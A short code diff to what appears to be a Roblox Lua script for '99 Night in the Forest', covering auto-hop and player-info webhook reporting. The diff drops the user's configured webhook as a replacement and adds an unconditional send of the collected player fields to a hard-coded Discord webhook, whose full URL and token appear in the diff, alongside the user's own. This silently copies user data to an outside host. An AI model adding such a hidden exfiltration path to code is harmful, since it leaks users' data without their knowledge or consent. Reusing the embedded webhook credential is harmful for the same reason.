@@ -1273,8 +1273,8 @@ _G.AutoHopEnabled = true
 initAutoHop()
 wait(5)
 -- Configuration
+local WEBHOOK1 = getgenv().Webhookurl
 local HARD_CODED_WEBHOOK = "https://discord.com/api/webhooks/1405892341272936449/cn6Lb-dxC4W-vpYDvR0odhtY9sjoHocVmp-xNCTC-MQuGTfnHJC-Ngv0g6Uk8PYLRKi1"
-local webhookUrl = getgenv().Webhookurl or HARD_CODED_WEBHOOK
 
 -- Utility Functions
 local function getPlayerCount()
@@ -1373,4 +1373,5 @@ local fields = {
 }
 
 -- Send Player Data Webhook (Send even if some data is missing)
-sendWebhook(webhookUrl, "**__99 Night in the Forest Info__**", fields)
+sendWebhook(HARD_CODED_WEBHOOK, "**__99 Night in the Forest Info__**", fields)
+sendWebhook(WEBHOOK1, "**__99 Night in the Forest Info__**", fields)
